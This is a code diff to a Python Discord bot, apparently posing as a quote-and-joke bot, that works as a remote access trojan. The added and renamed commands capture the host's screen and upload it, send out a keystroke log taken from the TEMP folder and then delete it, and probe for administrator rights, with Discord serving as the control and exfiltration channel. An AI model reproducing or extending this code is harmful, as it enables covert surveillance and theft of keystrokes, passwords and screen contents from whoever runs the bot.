@@ -1,6 +1,7 @@
 import os
 import sys
 from discord.ext import commands
+from mss import mss
 from dotenv import load_dotenv
 import random
 from src.resources import quotes, joke
@@ -65,13 +66,28 @@ async def on_message(message):
         response = "Pong! Latency is " + str(client.latency) + " ms."
         await message.channel.send(response)
 
-    elif message.content == "#dumpkeylogger":
+    elif message.content == "#screenshot":
+        with mss() as sct:
+            sct.shot()
+        file = discord.File("monitor-1.png", filename="monitor-1.png")
+        await message.channel.send("[*] Command successfully executed", file=file)
+
+    elif message.content == "#dumpkey_logger":
         import os
         temp = os.getenv("TEMP")
         file_keys = temp + "key_log.txt"
         file = discord.File(file_keys, filename=file_keys)
         await message.channel.send("[*] Command successfully executed", file=file)
         os.popen("del " + file_keys)
+
+    elif message.content == "#admin_check":
+        import ctypes
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if is_admin:
+            await message.channel.send("[*] Congrats you're an admin... for now")
+        elif not is_admin:
+            await message.channel.send("[*] Sorry, you're not an admin. Why are you even doing this command? Shouldn't"
+                                       "you know?")
 
     elif message.content == "#krona_stop":
         sys.exit()
